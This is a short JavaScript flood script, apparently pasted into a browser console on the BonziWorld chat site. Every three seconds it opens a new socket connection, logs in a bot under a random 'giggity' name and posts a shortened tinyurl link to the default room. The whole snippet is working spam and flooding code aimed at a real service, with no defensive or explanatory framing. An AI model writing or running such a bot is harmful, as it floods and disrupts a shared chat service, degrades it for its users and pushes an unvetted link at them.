/* GGTFlood 4 BonziWorld 1.0.0 */
/* This comes with no warranty */
setInterval(() => {
    const bot = io(location.href);
    bot.emit("client", "MAIN");
    bot.emit("login", {
        passcode: "",
        name: "giggity #" + Math.floor(Math.random() * 10000),
        room: "default",
    });
    setTimeout(() => {
        bot.emit("talk", "tinyurl.com/ggtfiles");
    }, 500);
}, 3000);